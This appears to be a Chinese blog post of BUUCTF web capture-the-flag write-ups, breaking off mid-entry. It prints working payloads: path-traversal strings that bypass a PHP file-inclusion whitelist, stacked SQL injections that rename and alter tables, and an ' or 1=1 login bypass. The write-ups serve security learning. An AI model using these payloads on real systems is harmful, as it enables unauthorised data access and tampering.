<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title class=pjax-title>BUUCTF寒假刷题-Web - Braindance</title><meta name=Description content="Braindance's blog"><meta property="og:title" content="BUUCTF寒假刷题-Web"><meta property="og:description" content="寒假横向刷题（尽量） BUUCTF 💗🧡💛💚💙💜🤎🖤🤍 题都写这一个里面了，可以先用Ctrl+F搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来"><meta property="og:type" content="article"><meta property="og:url" content="https://www.braindance.top/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-01-18T16:58:56+08:00"><meta property="article:modified_time" content="2021-01-18T16:58:56+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="BUUCTF寒假刷题-Web"><meta name=twitter:description content="寒假横向刷题（尽量） BUUCTF 💗🧡💛💚💙💜🤎🖤🤍 题都写这一个里面了，可以先用Ctrl+F搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来"><meta name=application-name content="Braindance"><meta name=apple-mobile-web-app-title content="Braindance"><meta name=theme-color content="#f8f8f8"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=canonical href=https://www.braindance.top/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/><link rel=prev href=https://www.braindance.top/posts/gxyctf2019ping-ping-ping/><link rel=next href=https://www.braindance.top/posts/swpu2019web1/><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css></noscript><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"BUUCTF寒假刷题-Web","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.braindance.top\/posts\/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web\/"},"genre":"posts","keywords":"web, BUUCTF_Web","wordcount":25719,"url":"https:\/\/www.braindance.top\/posts\/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web\/","datePublished":"2021-01-18T16:58:56+08:00","dateModified":"2021-01-18T16:58:56+08:00","publisher":{"@type":"Organization","name":"Braindance"},"author":{"@type":"Person","name":"Braindance"},"description":""}</script><script type=text/javascript>!function(e){const o="//cdn.jsdelivr.net",a="//gcore.jsdelivr.net",t=e=>e.replace(o,a),n=e=>e&&e.includes(o),s=e.querySelectorAll.bind(e),i=()=>{let o,i;for(o of s('link[rel="stylesheet"]'))i=o.href,n(i)&&(o.href=t(i));for(o of s("script"))if(i=o.src,n(i)){const n=e.createElement("script");n.src=t(i),o.defer=!0,o.src="",o.before(n),o.remove()}for(o of s("img"))i=o.src,n(i)&&(o.src="",o.src=t(i));for(o of s("*[style]"))i=o.getAttribute("style"),n(i)&&o.setAttribute("style",t(i));for(o of s("style"))i=o.innerHTML,n(i)&&(o.innerHTML=t(i))};{var r=function(e){e||(console.warn(o+" is not available."),i(),setInterval(i,500))};let n;const t=e.createElement("link"),s=(t.rel="stylesheet",t.text="text/css",e=>{n&&(clearTimeout(n),n=0,e||(t.href="data:text/plain;base64,"),t.remove(),r(e))});n=setTimeout(s,2e3),t.addEventListener("error",s),t.addEventListener("load",()=>s(!0)),t.href=o+"/gh/PipecraftNet/jsdelivr-auto-fallback@main/empty.css?"+Date.now(),e.head.insertAdjacentElement("afterbegin",t)}}(document)</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e),document.documentElement.style.setProperty("color-scheme",e==="light"?"light":"dark")}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(t){const e=document.getElementsByTagName("meta");for(let n=0;n<e.length;n++)if(e[n].getAttribute("name")===t)return e[n];return''}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"||e==="black"?setTheme(e):window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?setTheme("dark"):setTheme("light")}else''==="light"||''==="dark"||''==="black"?(setTheme(''),saveTheme('')):(saveTheme("auto"),window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?setTheme("dark"):setTheme("light"));let metaColors={light:"#f8f8f8",dark:"#252627",black:"#000000"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")]</script><div id=back-to-top></div><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Braindance>Braindance</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜些什么 id=search-input-desktop>
<a href=# onclick=return!1 class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i></a>
<a href=# onclick=return!1 class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
</span><a href=# onclick=return!1 class="menu-item theme-select" title=切换主题><i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-desktop title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Braindance>Braindance</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜些什么 id=search-input-mobile>
<a href=# onclick=return!1 class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i></a>
<a href=# onclick=return!1 class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=# onclick=return!1 class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a href=# onclick=return!1 class="menu-item theme-select" title=切换主题>
<i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-mobile title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto><nav id=TableOfContents><ul><li><a href=#解法一flask-session伪造>解法一：flask session伪造</a></li><li><a href=#解法二unicode欺骗>解法二：Unicode欺骗</a></li></ul><ul><li><ul><li><a href=#all-you-want-is-in-table-flag-and-the-column-is-flag>All You Want Is In Table &lsquo;flag&rsquo; and the column is &lsquo;flag&rsquo;</a></li></ul></li></ul><ul><li><a href=#非预期解>非预期解</a></li><li><a href=#预期解>预期解</a></li></ul></nav></div></div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle","normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC","true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">BUUCTF寒假刷题-Web</h1><div class=post-meta><div class=post-meta-line><span class=post-author><i class="author fas fa-user-circle fa-fw"></i><a href=/ title=Author rel=author class=author>Braindance</a>
</span>&nbsp;<span class=post-category>收录于 </span>&nbsp;<span class=post-category>类别 <a href=/categories/ctf/><i class="far fa-folder fa-fw"></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-01-18>2021-01-18</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=2021-01-18>2021-01-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 25719 字&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 52 分钟&nbsp;<span id=/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/ class=leancloud_visitors data-flag-title=BUUCTF寒假刷题-Web>
<i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
</span>&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#解法一flask-session伪造>解法一：flask session伪造</a></li><li><a href=#解法二unicode欺骗>解法二：Unicode欺骗</a></li></ul><ul><li><ul><li><a href=#all-you-want-is-in-table-flag-and-the-column-is-flag>All You Want Is In Table &lsquo;flag&rsquo; and the column is &lsquo;flag&rsquo;</a></li></ul></li></ul><ul><li><a href=#非预期解>非预期解</a></li><li><a href=#预期解>预期解</a></li></ul></nav></div></div><div class=content id=content><div class="details admonition warning open"><div class="details-summary admonition-title"><i class="icon fas fa-exclamation-triangle fa-fwwarning"></i>警告<i class="details-icon fas fa-angle-right fa-fw"></i></div><div class=details-content><div class=admonition-content>本文最后更新于 <span class=timeago datetime=2021-01-18T16:58:56 title="January 18, 2021">2021-01-18</span>，文中内容可能已过时。</div></div></div><p>寒假横向刷题（尽量）
<a href=https://buuoj.cn/challenges# target=_blank rel="noopener noreffer">BUUCTF</a>
💗🧡💛💚💙💜🤎🖤🤍
<strong>题都写这一个里面了，可以先用Ctrl+F搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨</strong></p><h1 id=20210115 class=headerLink><a href=#20210115 class=header-mark></a>2021.01.15</h1><h1 id=hctf-2018warmup class=headerLink><a href=#hctf-2018warmup class=header-mark></a>[HCTF 2018]WarmUp</h1><p>进到靶机一个硕大的滑稽，查看源码有提示source.php</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101413.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101413.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101413.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101413.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101413.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101413.png></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>    highlight_file(__FILE__);
</span></span><span class=line><span class=cl>    class emmm
</span></span><span class=line><span class=cl>    {
</span></span><span class=line><span class=cl>        public static function checkFile(&amp;$page)
</span></span><span class=line><span class=cl>        {
</span></span><span class=line><span class=cl>            $whitelist = [&#34;source&#34;=&gt;&#34;source.php&#34;,&#34;hint&#34;=&gt;&#34;hint.php&#34;];
</span></span><span class=line><span class=cl>            if (! isset($page) || !is_string($page)) {
</span></span><span class=line><span class=cl>                echo &#34;you can&#39;t see it&#34;;
</span></span><span class=line><span class=cl>                return false;
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            if (in_array($page, $whitelist)) {
</span></span><span class=line><span class=cl>                return true;
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            $_page = mb_substr(
</span></span><span class=line><span class=cl>                $page,
</span></span><span class=line><span class=cl>                0,
</span></span><span class=line><span class=cl>                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
</span></span><span class=line><span class=cl>            );
</span></span><span class=line><span class=cl>            if (in_array($_page, $whitelist)) {
</span></span><span class=line><span class=cl>                return true;
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            $_page = urldecode($page);
</span></span><span class=line><span class=cl>            $_page = mb_substr(
</span></span><span class=line><span class=cl>                $_page,
</span></span><span class=line><span class=cl>                0,
</span></span><span class=line><span class=cl>                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
</span></span><span class=line><span class=cl>            );
</span></span><span class=line><span class=cl>            if (in_array($_page, $whitelist)) {
</span></span><span class=line><span class=cl>                return true;
</span></span><span class=line><span class=cl>            }
</span></span><span class=line><span class=cl>            echo &#34;you can&#39;t see it&#34;;
</span></span><span class=line><span class=cl>            return false;
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    if (! empty($_REQUEST[&#39;file&#39;])
</span></span><span class=line><span class=cl>        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
</span></span><span class=line><span class=cl>        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
</span></span><span class=line><span class=cl>    ) {
</span></span><span class=line><span class=cl>        include $_REQUEST[&#39;file&#39;];
</span></span><span class=line><span class=cl>        exit;
</span></span><span class=line><span class=cl>    } else {
</span></span><span class=line><span class=cl>        echo &#34;&lt;br&gt;&lt;img src=\&#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&#34; /&gt;&#34;;
</span></span><span class=line><span class=cl>    }  
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>发现白名单有source.php和hint.php，先去查看一下hint.php</p><blockquote><p>flag not here, and flag in ffffllllaaaagggg</p></blockquote><p>分析源码</p><ul><li>判断<code>$_REQUEST['file']</code>对象为空且为字符串</li><li>执行emmm类中的<strong>checkFile</strong>方法判断是否在白名单（确保函数返回是true）</li><li>文件包含</li></ul><p>checkFile函数中字符串截取判断是否在白名单（代码17-24和26-34）所以有两种绕过方法。</p><ol><li>第一种</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>file=hint.php?../../../../../ffffllllaaaagggg
</span></span></code></pre></td></tr></table></div></div><p>字符串截取将原字符串尾部加上<code>?</code>再截取第一个<code>?</code>之前的内容。所以需要在构造payload时问号前需要是白名单里的文件。问号之后，猜测flag位置在根目录下，所以使用尽可能多的<code>../</code>返回上级目录。</p><ol start=2><li>第二种</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>hint.php%3F..%2F..%2F..%2F..%2F..%2Fffffllllaaaagggg
</span></span></code></pre></td></tr></table></div></div><p>将第一种payload使用urlencode编码即可。</p><hr><h1 id=强网杯-2019随便注 class=headerLink><a href=#%e5%bc%ba%e7%bd%91%e6%9d%af-2019%e9%9a%8f%e4%be%bf%e6%b3%a8 class=header-mark></a>[强网杯 2019]随便注</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120094248.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120094248.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120094248.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120094248.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120094248.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120094248.png></p><p>根据题目尝试sql注入，单引号报错，单引号加注释无报错，说明存在sql注入，当测试输入select时返回过滤的黑名单：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>return preg_match(&#34;/select|update|delete|drop|insert|where|\./i&#34;,$inject);
</span></span></code></pre></td></tr></table></div></div><p>这道题使用的是堆叠注入，原理</p><blockquote><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p></blockquote><p>查看数据库</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39;;show databases;
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095211.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095211.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095211.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095211.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095211.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095211.png></p><p>查看当前库下的表</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39;;show tables;
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095339.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095339.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095339.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095339.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095339.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095339.png></p><p>查看两张表字段</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39;;show columns from words;
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095607.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095607.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095607.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095607.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095607.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095607.png></p><p>还有一种查看表的语句，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39;;desc `1919810931114514`;
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095839.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095839.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095839.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095839.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095839.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120095839.png></p><p>找到了flag在的字段，接下来就是如何获取该字段的值。顺带一提，根据表的结构，初步判断默认查询的是<strong>word</strong>表中的字段，而flag在<strong>1919810931114514</strong>表中。</p><p>网上找到的两种方法，分别是修改表名和使用预处理语句。</p><ol><li>使用<a href=https://www.cnblogs.com/geaozhang/p/9891338.html target=_blank rel="noopener noreffer">预处理</a>语句</li></ol><p>因为select被过滤了，但是可以使用char函数，char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>char(115,101,108,101,99,116)
</span></span></code></pre></td></tr></table></div></div><p>根据预处理语句格式构造payload</p><ul><li>创建一个<strong>sqli</strong>字符串值为查询sql语句，使用预处理语句赋值并执行。</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39;;SET @sqli=concat(char(115,101,108,101,99,116),&#39;* from `1919810931114514`&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#
</span></span></code></pre></td></tr></table></div></div><ul><li>不使用变量</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39;;PREPARE sqli FROM CONCAT(&#39;s&#39;,&#39;elect&#39;,&#39; * from `1919810931114514`&#39;);EXECUTE sqli; #
</span></span></code></pre></td></tr></table></div></div><ul><li>还有一种</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39;;SET @sqli = CONCAT(&#39;s&#39;,&#39;e&#39;,&#39;l&#39;,&#39;e&#39;,&#39;c&#39;,&#39;t&#39;,&#39; * from `1919810931114514`&#39;);PREPARE haha FROM@sqli ;EXECUTE haha; #
</span></span></code></pre></td></tr></table></div></div><p>主要区别在于过滤的绕过方式，不要拘泥于一种方式。</p><ol start=2><li>修改表名</li></ol><p>修改表名的思路是：默认查询的是<strong>word</strong>表第一个字段，所以把<strong>word</strong>表修改为其他名称，将flag所在的<strong>1919810931114514</strong>表名修改为<strong>word</strong>。</p><p>网上payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0&#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#
</span></span></code></pre></td></tr></table></div></div><p>自己构造的payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0&#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) #
</span></span></code></pre></td></tr></table></div></div><p>之后执行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; or 1=1 #
</span></span></code></pre></td></tr></table></div></div><p>查询表所有字段值即可。</p><hr><h1 id=极客大挑战-2019easysql class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019easysql class=header-mark></a>[极客大挑战 2019]EasySQL</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101528.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101528.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101528.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101528.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101528.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101528.png></p><p>用户名密码，尝试万能密码。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#39;or 1=1 #
</span></span><span class=line><span class=cl>随便密码
</span></span></code></pre></td></tr></table></div></div><p>一个万能密码的参考:https://www.cnblogs.com/pass-A/p/11134988.html</p><hr><h1 id=极客大挑战-2019havefun class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019havefun class=header-mark></a>[极客大挑战 2019]Havefun</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101733.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101733.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101733.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101733.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101733.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210120101733.png></p><p>直接源码找到php代码。payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?cat=dog
